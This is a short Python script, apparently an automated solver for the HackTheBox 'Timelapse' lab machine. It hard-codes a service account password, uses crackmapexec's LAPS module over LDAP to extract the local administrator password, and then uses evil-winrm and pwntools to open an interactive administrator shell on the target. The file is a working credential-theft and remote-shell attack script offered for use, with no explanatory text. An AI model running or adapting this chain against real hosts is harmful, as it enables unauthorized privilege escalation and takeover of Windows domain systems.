import subprocess
from pwn import *
#coded by vanishyi

ip = input("put in the target ip address:").replace('\n','')

pase1 = """crackmapexec ldap timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost timelapse.htb -M laps | grep Password: | sed 's/Password: //'"""
p1 = subprocess.Popen(pase1, shell = True, stdout = subprocess.PIPE)
line1 = p1.stdout.readline()
x = line1.rstrip()[-28:-4]
rpass = x.decode()

shell = "evil-winrm -i " + ip + " -u administrator -p '" + rpass + "' -S"
print(shell)

pwn = process('/bin/sh')
pwn.sendline(shell)
pwn.interactive()
